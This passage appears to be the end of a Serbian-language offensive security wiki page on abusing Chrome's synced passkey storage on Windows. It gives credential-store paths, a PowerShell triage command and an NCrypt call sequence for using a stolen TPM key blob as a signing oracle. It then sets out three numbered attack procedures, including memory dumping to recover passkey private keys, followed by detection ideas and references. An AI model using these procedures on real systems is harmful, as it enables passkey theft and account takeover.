%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** čuva protobuf-kodirane zapise **`WebauthnCredentialSpecifics`**. Proces istog korisnika može da izlista **RP ID**, **username**, **credential ID** i šifrovani materijal privatnog ključa za sinhronizovane passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** čuva lokalno stanje registracije uređaja, kao što su **`wrapped_identity_private_key`** i zaštićena tajna koja se koristi za oporavak sinhronizovanih kredencijala.<sup>[[4]](#references)</sup>

Brza trijaža:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-vezani blobovi ključeva i dalje mogu da se zloupotrebe kao lokalni oracle za potpisivanje

Ako pregledač izveze identitetski ključ podržan TPM-om kao **`NCRYPT_OPAQUE_KEY_BLOB`** i sačuva taj blob u stanju dostupnom korisniku, malver **ne mora** da izdvoji sirovi privatni ključ. Može jednostavno ponovo da uveze blob na **istoj mašini** i zatraži od lokalnog TPM-a da potpiše podatke koje kontroliše napadač:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Ovo znači da **hardware binding sprečava izvoz van uređaja, ali ne i upotrebu od strane istog korisnika na kompromitovanom endpointu**.

### Praktični načini zloupotrebe

1. **Pass-ta-key / relay identiteta uređaja**<sup>[[4]](#references)</sup>
   - Enumerišite `WebauthnCredentialSpecifics` iz Chrome-ovog LevelDB-a.
   - Pokrenite prijavu pomoću passkey-a i pribavite svež WebAuthn challenge.
   - Upotrebite ukradeni blob `wrapped_identity_private_key` na TPM-u žrtve da biste potpisali binding zahteva cloud-authenticator-a.
   - Prosledite dobijeni assertion relying party-ju.
   - Ovo je naročito korisno kada RP prihvata `userVerification=preferred` ili ne odbacuje assertion-e sa **`UV=0`**.
2. **Otmica UV ključa na čekanju**<sup>[[4]](#references)</sup>
   - Prisilno pokrenite ponovno onboarding brisanjem `passkey_enclave_state` ili slanjem validne potpisane operacije `device/forget`.
   - Ako onboarding ostavi uređaj u stanju **`uv_key_pending`**, registrujte UV javni ključ koji kontroliše napadač.
   - Ako provajder ne proverava attestation / poreklo secure-hardware-a za novi UV ključ, kasniji potpisi napadačevog ključa tretiraju se kao **`UV=1`**.
3. **Krađa master secret-a / SDS-a tokom oporavka**<sup>[[4]](#references)</sup>
   - Prisilno pokrenite oporavak ili ponovno pridruživanje, kako bi Chrome preuzeo master secret za sinhronizovane passkey-e.
   - Pratite ponovno kreiranje/izmenu `passkey_enclave_state`, a zatim izbacite sadržaj Chrome memorije dok je plaintext **security domain secret (SDS)** u memoriji.
   - Upotrebite oporavljeni SDS da biste dešifrovali šifrovana polja u svakom zapisu `WebauthnCredentialSpecifics` i oporavili prenosive WebAuthn privatne ključeve.

### DFIR / ideje za detekciju

- Pratite **brisanje/ponovno kreiranje** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Upozoravajte na neuobičajen pristup Chrome-ovom **`Sync Data\LevelDB`** iz procesa koji nisu pregledač.
- Upozoravajte na **izbacivanje sadržaja Chrome memorije** ili sumnjiv pristup memoriji između procesa.
- Istražite ponovljene upite za **Google Password Manager recovery PIN** ili neočekivano ponovno pokretanje onboarding-a.
- Imajte na umu da **`signCount`** za WebAuthn često nije koristan kod sinhronizovanih passkey-a jer može ostati nepromenjen, pa je klasična detekcija kloniranja slaba.

## References

- [1] [Unit 42 – Istraga višegodišnjih neotkrivenih operacija usmerenih na sektore od velike vrednosti](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing putem Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Unutar Ink Dragon-a: otkrivanje relay mreže i unutrašnjeg rada prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: nova površina za napad u autentifikaciji bez lozinke](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG skladištenje ključeva](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hakovanje Windows-a: napadi na Microsoft sisteme i mreže](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Kako Active Directory skladište podataka zaista funkcioniše: unutar NTDS.dit (1. deo)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Daljinsko izbacivanje lozinki iz LSASS-a](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho proširuje svoj arsenal sajber špijunaže pomoću Still toolkita](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – funkcija CreateFileW i `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy režim pravljenja rezervne kopije `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – prekid aktivnih sesija](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard i Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: zaštita i upravljanje akreditivima](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz - podržani ulazi i brzi početak](https://github.com/nikaiw/VMkatz)
- [18] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
